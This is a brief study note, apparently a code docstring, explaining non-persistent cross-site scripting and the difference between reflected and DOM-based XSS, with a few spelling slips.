"""Reflected:
There are two types of Non-Persisten XSS vulnerabilities:
Reflected XSS, which gets processed by the back-end server,
and DOM-based XSS, which is completely processed on the 
client-side and never reaches the back-end server. Unlike
Persistent XSS, Non-Persisten XSS vulneratbilities
are temporary and are not persisten through page refreshes.
Hence, our attacks only affect the targeted user and will not
affect other users visit the page.
